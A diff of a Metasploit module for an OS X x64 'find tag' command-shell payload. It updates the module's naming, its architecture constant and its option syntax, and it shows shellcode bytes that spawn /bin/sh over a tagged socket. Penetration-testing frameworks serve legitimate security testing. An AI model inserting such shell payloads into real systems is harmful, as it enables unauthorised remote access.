@@ -1,14 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/handler/find_tag'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
 
   CachedSize = 107
 
@@ -23,7 +19,7 @@ module Metasploit3
       'Author'        => 'nemo <nemo[at]felinemenace.org>',
       'License'       => MSF_LICENSE,
       'Platform'      => 'osx',
-      'Arch'          => ARCH_X86_64,
+      'Arch'          => ARCH_X64,
       'Handler'       => Msf::Handler::FindTag,
       'Session'       => Msf::Sessions::CommandShellUnix
 
@@ -33,7 +29,7 @@ module Metasploit3
         [
           OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
           OptString.new('TAG',  [ true,  "The tag to test for", "NEMO" ]),
-      ], self.class)
+      ])
   end
 
   #
@@ -79,5 +75,4 @@ module Metasploit3
       "\x48\x89\xE6" +                    # mov rsi,rsp
       "\x0F\x05"                          # loadall286
   end
-
 end
